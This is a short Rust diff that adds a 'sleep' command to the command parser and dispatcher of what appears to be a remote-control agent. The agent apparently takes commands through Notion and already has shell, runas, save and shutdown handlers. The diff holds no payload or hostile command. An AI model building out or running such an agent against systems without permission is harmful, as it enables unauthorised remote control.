@@ -16,6 +16,7 @@ mod pwd;
 mod runas;
 mod save;
 mod shell;
+mod sleep;
 mod shutdown;
 mod unknown;
 
@@ -33,6 +34,7 @@ pub enum CommandType {
     Runas(String),
     Shell(String),
     Shutdown,
+    Sleep(String),
     Unknown(String)
 }
 
@@ -81,6 +83,7 @@ impl NotionCommand {
                 "save"     => CommandType::Save(command_string),
                 "shell"    => CommandType::Shell(command_string),
                 "shutdown" => CommandType::Shutdown,
+                "sleep"    => CommandType::Sleep(command_string),
                 _          => CommandType::Unknown(command_string)
             };
             return Ok(NotionCommand { command_type: command_type});
@@ -104,6 +107,7 @@ impl NotionCommand {
             CommandType::Save(s)     => save::handle(&s, config_options).await,
             CommandType::Shell(s)    => shell::handle(&s).await,
             CommandType::Shutdown    => shutdown::handle().await,
+            CommandType::Sleep(s)    => sleep::handle(&s, config_options).await,
             CommandType::Unknown(_)  => unknown::handle().await
         }
     }
